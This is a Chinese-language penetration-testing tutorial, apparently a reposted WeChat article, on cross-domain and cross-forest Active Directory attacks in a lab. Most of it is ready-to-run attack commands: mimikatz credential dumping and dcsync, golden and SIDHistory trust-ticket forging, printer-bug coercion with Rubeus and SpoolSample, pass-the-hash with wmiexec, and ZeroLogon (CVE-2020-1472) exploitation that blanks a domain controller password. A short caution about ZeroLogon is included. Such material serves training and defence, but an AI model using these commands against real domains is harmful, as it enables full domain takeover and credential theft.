<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/a5E074yq9ICiz_bNW3Ffqg)

> 作者：C1ay，转载于国科漏斗社区。

**U****MMER**

**一、前言**

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLvodermhibAyc7mAPtB0AWgXe2rVdImOtCnBkLuDGaoED0k4r1NSjEqw/640?wx_fmt=png&wxfrom=13&tp=wxpic)

在本篇文章中，斗哥将继续为大家介绍如果目标机器处于一个域林环建时，我们该怎么通过跨域攻击以及跨林攻击的一些方法获取更高的权限，方便我们后续的渗透测试。

**SUMMER**

**二、跨域攻击分析及防御**

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLvodermhibAyc7mAPtB0AWgXe2rVdImOtCnBkLuDGaoED0k4r1NSjEqw/640?wx_fmt=png&wxfrom=13&tp=wxpic)

### 2.1 跨域攻击概述

很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以主域和子域进行划分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不同的区域。攻击者如果得到了某个子公司或者某个部门的域控制器权限，但没有得到整个公司内网的全部权限 (或者需要的资源不在此域中), 往往会想办法获取其他部门(或者域) 的权限。因此，在部署网络边界时，如果能了解攻击者是如何对现有网络进行跨域攻击的, 就可以更安全地部署内网环境、更有效地防范攻击行为。

### 2.2 跨域攻击方法分析

常见的跨域攻击方法如下:

●常规渗透方法 (例如利用 Web 漏洞跨域获取权限)。

●利用已知域散列值进行哈希传递攻击或票据传递攻击 (例如域控制器本地管理员密码可能相同)。

●利用域信任关系进行跨域攻击。

### 2.3 利用域信任关系的跨域攻击

域信任的作用是解决多域环境中的跨域资源共享问题。   
域环境不会无条件地接收来自其他域的凭证，只会接收来自受信任的域的凭证。在默认情况，特定 Windows 域中的所有用户都可以通过该域中的资源进行身份验证。通过这种方式，域可以为其用户提供对该域中所有资源的安全访问机制。如果用户想要访问当前域边界以外的资源，需要使用域信任。 

  
域信任作为域的一种机制，允许另一个域的用户在通过身份验证后访问本域中的资源。同时，域信任利用 DNS 服务器定位两个不同子域的域控制器, 如果两个域中的域控制器都无法找到另一个域，也就不存在通过域信任关系进行跨域资源共享了。

#### 2.3.1 域信任关系简介

1、信任是有方向的，分为单向信任和双向信任。

单向信任：A 域信任 B 域，意味着 A 域的管理员可以将 A 域的资源分配给 B 域的用户。如果不进行资源分配，B 域的用户无法获得任何资源，但是可以查询域信息。

双向信任：双向信任是指两个单向信任的组合, 信任域和受信任域彼此信任，在两个方向上都有信任流和访问流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有域信任关系都是双向可传递的。在创建子域时，会在新的子域和父域之间自动创建双向可传递信任关系，从下级域发出的身份验证请求可以通过其父域向上流向信任域。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLKDb93sq5StcyVh3PvyiaxRBU9M1ibticWfIzkOenNic2qEhrTzPMf5GynQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

当 A 域信任 B 域时，A 域会传出信任，B 域会传入信任。在 B 域访问 A 域时，A 域是信任域，B 域是受信任域。

2、信任传递

在 NT4 的域时代，信任关系不具有传递性。因此微软在 Win2000 发布时, 允许在域树和域林内进行信任关系的传递。win2003 开始允许域林之间的传递。

3、域树域林

如果一个域是另一个域的子域，那么这两个域可以组成一个域树。在林内新建一个命名空间不连续的域便组成了一个域林。整个域林中创建的第一个域就是根域。

4、域间信任分类

●父子域信任：创建子域时自动生成的双向信任。父域企业管理员默认情况下对子域有管理权限。

●树状根目录信任：创建域树时自动生成的双向信任。

●林信任：需要手动创建。林信任仅有部分转移性，A 林信任 B 林，B 林信任 C 林，A 林和 C 林之间不会自动有信任关系。

●外部信任：需要手动创建，不具备信任传递性。

内部信任：具有传递性，一般存在与子域之间。

●快捷方式信任：需要手动创建，用来缩短验证时间。

●领域信任：需要手动创建，是非 Windows 系统（比如 Linux）的 Kerberos 领域和 AD DS 域之间的信任关系。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibL8sVJn1mE6TJBpkFeaBb2O3AVcERQOI2Lwft5BiccSIfXNVx3C8osC6w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.3.2 获取域信息

##### 2.3.2.1 环境说明

<table><tbody><tr><td width="53.33333333333333"><p><strong>系统</strong></p></td><td width="123.33333333333333"><p><strong>角色</strong></p></td><td width="65.33333333333333"><p><strong>IP 地址</strong></p></td></tr><tr><td width="46.33333333333333"><p>Win2012</p></td><td width="110.33333333333333"><p>主域域控：dc.pentest.lab</p></td><td width="65.33333333333333"><p>172.16.1.2</p></td></tr><tr><td width="46.33333333333333"><p>Win2012</p></td><td width="110.33333333333333"><p>子域域控：sub.cn.pentest.lab</p></td><td width="65.33333333333333"><p>172.16.1.5</p></td></tr><tr><td width="46.33333333333333"><p>Win7</p></td><td width="110.33333333333333"><p>子域域内主机：cn\C1ay</p></td><td width="65.33333333333333"><p>172.16.1.20</p></td></tr></tbody></table>

##### 2.3.2.2 查看域间信任

1、nltest /domain_trusts

●/PRIMARY 仅返回计算机账户属于的域，

●/FOREST 仅返回主域同一森林下的域

●/DIRECT_ OUT 返回被主域明确信任的域

●/DIRECT_ IN 返回明确信任主域的域

●/ALL_TRUSTS 返回所有已信任的域

/V 显示详细的输出，包括域的 SIDs 和 GUIDs

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLGHBbRn5VKWp2CavdAyQibOD7hfJicaRBuDZ1tiayJJcZs5XHFyCeSlSEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

0x20 表示根域与当前域处于同一个林内。

2、powerview

下载地址：https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

执行如下命令，跨域查看域信任关系。

```
PowerShell.exe -ExecutionPolicy Bypass -command ". .\powerview.ps1;Get-NetDomainTrust"

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLsAGNkKooNft7v8KIH7YGDbw4iaI83Bb7Sy6goK5xcibNdRXSwtodbKmA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

3、netdom query trust

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLl04ckjCVQE0EQaNEtcLd8snh2z4H3x3XvlgZEVHDqcqibgBC6ibYaQvg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

该命令需要在域控制器上执行。

##### 2.3.2.3 收集域内详细信息

1、通过 powerview

查询指定域下的用户信息，命令如下：

```
PowerShell.exe -ExecutionPolicy Bypass -command ". .\powerview.ps1;Get-NetUser -Domain pentest.lab administrator"

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLSicOaibTs6mRpkck4FaMrlYdEvFgyJibrSiatgyNP91jKGxD218ibibMVWdQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2、AdFind

```
adfind.exe -h 指定域控 -sc u:*

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLs0XuRpFUnfCGs6nnZvrwFo0GEIQ34ojJfJvBKpuPp5QVFj1kWI4ib8w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

3、adexplorer

下载地址：AD Explorer - Windows Sysinternals | Microsoft Docs

1、连接到目标域控制器。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLITOyMIS1iavM6ckkFN5nsIEpp2Ye6Ga8aG9HYfcJuVicCgib3M2eicV8Ug/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2、查看目标域控制器上的用户信息

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLibH4mbo8gs2Pq2ACic00nZv1tkXn2ibyRT6v5PxpfnYaYtluzJsSbNsKg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

3、通过 Seach 查看指定用户的信息

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLr1DjjNvOawNlesq2rs63LVVpQibef3GUy8FRy47fH0kQWBBsCflrAicw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2.3.2.4 收集域网络信息

1、nltest + ping

输入如下命令获取域控制器计算机名。

```
nltest /dclist:pentest.lab

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibL7x5ks5pVk6Pq066GcpBfNJG0jttjic304QGfSD90liauQ7iarbzzvkYpw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

通过 ping 获取域控制器的 IP 地址。

```
ping dc.pentest.lab -n 1

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLIiaiadPFOCQVplvwgWxZob7LJztfIwasKfmstJ5YfLQomqP8fic8qL0WQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2、dnscmd

输入如下命令枚举当前的 dns 区域。

```
dnscmd /enumzones

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLvicic7QIsKibl0ax6HiavNZjwvmH4Kic551IdBcMKiavnDIFB5SmoyrEgRyw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

输入如下命令获取 dns 域内的信息。

```
dnscmd /zoneprint cn.pentest.lab

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLXYfc62iaXcdu5Q10vibU8oK5brhTCQXFP4QmbtQqmeBtUAUQ69B2Hk0A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.3.3 利用域信任密钥获取目标域的权限

1、SIDHistory 介绍和利用

SIDHistory 版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则 SIDHistory 会被微软的 SID Filter 规则过滤掉，从而失效，但森林内部不会有 SID Filter 规则。

由于每个域的 SID 都不同，叠加 SIDHistory 的黄金票据不具备通用性。根据微软的描述，在同一个域森林内部，企业管理组 EA(Enterprise Administrators) 会自动被森林内部所有域加入到本域的域管理员组，且 EA 只存在于根域中，所以企业管理组 EA 的 SID 固定为根域的 SID 加上固定的 RID 即 519。

如果将使用企业管理组 EA 的 SID 设置 SIDHistory 属性，和黄金票据结合，则在只获取任意一个域 krbtgt 账号 NTLM 值的前提下，可实现森林内部所有域的跨域黄金票据，这种票据可简称为 SIDHistory 版黄金票据。

2、域信任秘钥的获取

（1）存在信任账户的情况下：Dcsync 获取信任账号的 NTLM 值

通过如下命令获取域信任账户。

```
Get-ADUser -Filter {samAccountName -like "*$"}

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLAQ28UXrjZ7CssCCH724tyFTXKdqOk9E7SibFJFW24upGTdLnuBiaIPjA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

通过如下命令获取信任账号的 ntml 值。

```
lsadump::dcsync /user:pentest$@cn.pentest.lab

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLP2tdXa5kGK8DSiac0yWUCibVJicJMzgafhic71iaMFnLEdX0UT8IGDYbKTw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（2）内部信任：lsadum 获取信任账号的 NTLM 值

通过如下命令获取信任账号的 NTML 值，当前域和目标域的 SID 值。

```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch /user:pentest$" "lsadump::trust /patch" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLPxhSc5UicVhONdd3OeN5JZFB4DibcITTPNJS5d6iaibgNjYM7WLmricNG2A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（3）信任票据的创建

创建信任票据，格式如下：

```
mimikatz.exe “Kerberos::golden /domain:当前域名 /sid:当前SID /sids:目标SID-519  /rc4:信任秘钥  /user:任意用户名 /service:krbtgt /target:目标域 /ticket:pentest.kirbi" exit

```

519 代表创建的用户是属于目标域的管理员组，一般是是林内的 Enterprise admins 的组内用户。

输入如下命令，创建信任票据。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLiam3nSfKdWCNSRVON2EA0unHsx3Vn1p1ofHHvgC6CMFFicomQ1h8UOqA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（4）TGS 获取和利用

首先向 TGS 申请票据，命令如下。

```
asktgs.exe ./pentest.kirbi CIFS/pentest.pentest.lab

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLTib5pRw9rmouNic0e9WW59pmdTD72dmHJiaNh4ZtlADficGibDIibtUNKusg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（5）导入票据。

导入前，尝试访问 dc 的 c 盘，发现访问失败。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLC2JDpplSbVjrxdLFxicoKhiakpnreEnA9XhibfMtaASu2pOmQKNnyF14Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

通过如下命令导入票据。

```
.\kirbikator.exe lsa .\CIFS.pentest.pentest.lab.kirbi

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLB5znfQgPTh341ibRXcDpTl1VlO4wwILsPJiazuONHM3OtYfxibEXic7hKA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

导入票据后，尝试访问 dc 的 c 盘，发现成功访问。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLMGPwscnzbIhGWB2GDvllT0RWCoDjSR7QC59sJkBMP3m5qh2955JwGA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.3.4 利用 krbtgt 散列获取目标域权限

（1）获取 Krbtgt 散列。

通过如下命令获取 Krbtgt 散列。

```
mimikatz.exe "privilege::debug" "lsadump::lsa /patch /user:krbtgt" "sekurlsa::krbtgt" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibL90Siafgb5iaKnUdmdAYb5j9Zxk2tRBk9nuReTL2fhzgpFib61ibD469PJg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（2）构造并注入黄金票据

```
mimikatz.exe “Kerberos::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-519 /krbtgt: krbtgt散列 /ptt" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLdyjlfReq6uvrD5at76ich9juLwBcpSjvVjuMoOwicljPcL6tnHLOqs0A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（3）尝试访问 dc 下的 c 盘文件

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLK8D7jtHxcJkp9lmWZWgiblZnlkG0GXoIdnbicN9voE41bo3t73WZCicYg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

### 2.4 利用林信任关系的跨林攻击

#### 2.4.1 环境说明

<table><tbody><tr><td width="54.33333333333333"><p><strong>系统</strong></p></td><td width="100.33333333333333"><p><strong>角色</strong></p></td><td width="100.33333333333333"><p><strong>IP 地址</strong></p></td></tr><tr><td width="43.33333333333333"><p>Win2012</p></td><td width="103.33333333333333"><p>当前林的域控：dc.pentest.lab</p></td><td width="103.33333333333333"><p>172.16.1.2</p></td></tr><tr><td width="43.33333333333333"><p>Win2012</p></td><td width="103.33333333333333"><p>目标林的域控：dc1.c1ay.lab</p></td><td width="103.33333333333333"><p>172.16.1.22</p></td></tr></tbody></table>

因为在本次环境中我们是通过林信任进行了跨林攻击，因此在搭建环境时需要配置林信任，配置方法可以参考如下链接：https://www.jb51.net/os/windows/win2008/82054.html。

验证林信任是否成功建立可以通过以下两种方式：

1. 通过 nltest /domain_trusts 命令进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLD5hKmyrBrsRocgBUoRTLXOQ5cNY1H37Wicf3fpbNvGwkEMp4sHO9kTQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

2. 点击管理工具 ->AD 域和信任关系 ->pentest.lab-> 属性 -> 信任

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLr4D0Oxftraiba5huo5L16AuuNoibF8bEKxvaLtLAz1nnicAO7sov1WJBw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.4.2 获取域信息

1、利用信任关系获取信任域的信息

因为外部信任和林信任中存在 SID 过滤机制，所以无法利用 SID History 获取权限。

在本实验中，使用 adfind 工具获取信任域的完整信息。下面以获取 Administrator 用户的详细信息为例，输入如下命令。

```
adfind -h dc1.c1ay.lab -sc u:Administrator

```

通过对比目标域和当前域的用户列表，找出同时加入这两个域的用户。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLiaHDXSibHQq7qF9VNv5gnleePqcAVRPicnFfLlpEW6XuWVcGRjK9j5BoQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

也可以通过 powerview 脚本获取更多信息，执行如下命令列出目标域用户组中的外部用户。

```
Get-DomainForeignGroupMember -Domain 目标域

```

2、获取无约束委派的计算机

通过 adfind 工具，命令如下。

```
AdFind.exe -b "DC=c1ay,DC=lab" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLh2EbN2jia8liblveCWAeLXTXsTHP660ticZs6fYFnbxL1CRS2qZpyaKOg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

通过 powerview 脚本，命令如下。

```
Get-NetComputer -Unconstrained -Domain c1ay.lab | findstr cn

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLgN1UBlW8fo1ttApGSGdQGP4nLZZNBiaJwdkS3p3UvhcWA0HtqQF43QQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.4.3 利用无约束委派和 MS-RPRN 获取信任林权限

无约束委派原理可以参考本篇文章：https://blog.csdn.net/qq_41874930/article/details/110633298

如果已经我们获取了域林中某个域控制器的权限，或者配置了无约束委派的任何服务器的权限，就可以使用 MS-RPRN 的 RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的散列值。

具体流程如下：

环境中涉及的工具的下载地址如下：shanfenglan/test (github.com)

首先，输入下列命令，在 dc.pentest.lab 上使用 rubeus 工具，监控身份认证请求。interval 参数用于设置监控的时间间隔，单位为秒，filteruser 用于指定渗透测试中需要关注的用户。

```
Rubeus.exe monitor /interval:5 /filteruser: BDC$

```

这里要注意运行 Rubeus.exe 需要安装. net 3.5，安装步骤可以参考：https://blog.csdn.net/F12138_/article/details/80220698

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLtbZ6qX7C9mBaqMZRMKhYHSf1QnYBvqjniaNEO7TVIec5M5P0MqMiagqA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

开启监听后，在命令行环境中执行如下命令，使用 SpoolSample 让目标域控制器 dc1.c1ay.lab 向 dc.pentest.lab 发送身份认证请求。

```
.\SpoolSample.exe dc1.c1ay.lab dc.pentest.lab

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLmEV2js1Dat949hab48aibzYfjbS9WbbCSGUBCIQY17qHHNgvGsggeBA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

此时，rebeus 会抓取到来自 c1ay.lab 的认证请求，保存其中的 TGT 数据。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLTQaRgABgNjW2eoD1IrxhOO1n3bvGS2ianoIw8UVam80gKiaBwlGU3NWg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

清除 TGT 数据文件中多余的空格和换行符，输入如下命令，使用 rebeus 工具将票据注入内存。

```
Rubeus.exe ptt /ticket:TGT数据

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLic5Ea6xyGUpibYPtABpTLic29Bj6PiclicpXTeUG7pnezwicDlr3QKIG79cQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

使用 mimikatz 获取目标域的 krbtgt 散列值，输入如下命令，通过 mimikatz 的 dcsync 模拟域控向目标域控发送请求。

```
mimikatz.exe privilege::debug "lsadump::dcsync /domain:cn.lab /user:krbtgt" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibL8ibjPVuLZcbIiaKvYJ9BKaGFetGZ5vkw21oIsG4yn72VaRM8Q2tQia8rw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

输入如下命令，构造黄金票据将其注入内存，获取目标域控权限。

```
mimikatz.exe "kerberos::golden /user:administrator /domain:c1ay.lab /sid:目标sid值 /rc4:krbtgt散列值 /ptt" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibL5v1HicgzdanJ07mT2ReRPE7YJOGXIApEo2icwJjQIfAuNTBvXqmPicb4g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

成功注入黄金票据后，我们可以尝试访问目标 dc 下的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLqNu6Tvtngn92CjjUAlaicrnFfGJ28ibpt28Y72WZlwGnOMgiaiaAK8EVWg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

访问成功，到此跨林攻击完成。

在获取到目标域控的域管哈希后，我们也可以通过 impacket 中的 wmiexec 进行攻击，域管哈希获取命令如下。

```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:c1ay.lab /all /csv" exit

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLia1ySAnpYNONgDT1j0xwwV5arJoVEljOUQ8taGDAUjcDnn51OEMyZ3A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

运行如下命令获取目标林的权限。

```
python3 wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33 dc1.c1ay.lab/administrator@172.16.1.22

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLsf1hrvoV3MRIGJB7Dhs3V0WJ0QvdGCQtSDRPDib2A32XzLFrPcVgO6Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到成功获取到目标林的域控权限。

**2.5 通过 CVE-2020-1472 获取域控权限**

1、CVE-2020-1472 简介

NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。

微软 MSRC 于 8 月 11 日 发布了 Netlogon 特权提升漏洞安全通告。此漏洞 CVE 编号 CVE-2020-1472， CVSS 评分: 10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon。

exp 下载地址如下：

●https://github.com/VoidSec/CVE-2020-1472

●https://github.com/risksenselzerologon

2、利用方式

说明：本次测试是在虚拟机环境中，在真实环境尽量不要使用该漏洞攻击，使用后会直接影响与其他域控制器的通信和该域控上的功能（例如：DNS 服务等），在授权环境下如果真的需要使用该漏洞，建议先与客户进行沟通后再进行使用，使用前应该将 sam 表进行导出，方便后续恢复。

（1）通过 git clone 下载 exp，命令如下。

```
git clone https://github.com/risksense/zerologon.git

```

（2）安装依赖环境，命令如下。

```
pip3 install -r requirements.txt

```

（3）将目标域控密码置空，命令如下。

```
python3 set_empty_pw.py dc1 172.16.1.22

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLicqXKtaBgX5I7gUvAZsURMvI6ABXu7icicza3yLWCtIVG3zMQ40TNz1vw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（4）导出目标域控的散列值，命令如下。

```
python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'dc1.c1ay.lab/dc1$@172.16.1.22'

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLDzhXBxLD2ujg5SZTicBabmbQdyJmRsRib2dLJmdjftt3EadZ4lwAEv5A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（5）通过 impacket 工具包中的 wmiexec 获取权限，命令如下。

```
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33 dc1.c1ay.lab/administrator@172.16.1.22

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLwZrJ6epqWarA2IAIPbDhIhnHauFzIfOpxiaahTZ8OJCmRoYFsLJGYbQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

（6）通过 powershell 还原机器账户，命令如下。

```
Reset-ComputerMachinePassword

```

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLneS58FMh5Pn4qsh5vvshbzJuDIXCFcumjKNQ9lKtVoxE3dbbYxchVA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

到此漏洞复现完成。  

**SUMMER**

**三、后语**

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLvodermhibAyc7mAPtB0AWgXe2rVdImOtCnBkLuDGaoED0k4r1NSjEqw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

当我们成功获取到目标主机权限时往往会因为服务器管理员发现和修补漏洞而导致对服务器权限的丢失，在下一篇文章中，斗哥将继续为大家介绍一些权限维持的方法，敬请期待！

**SUMMER**

**四、参考链接**

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHhCsmAB7iaz3CrdVc2d01CibLvodermhibAyc7mAPtB0AWgXe2rVdImOtCnBkLuDGaoED0k4r1NSjEqw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

1、《内网安全攻防渗透测试实战指南》   
2、https://blog.csdn.net/mukami0621/article/details/108605941

**侵权请私聊公众号删文**

 **热文推荐**  

*   [蓝队应急响应姿势之 Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
    
*   [通过 DNSLOG 回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
    
*   [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
    
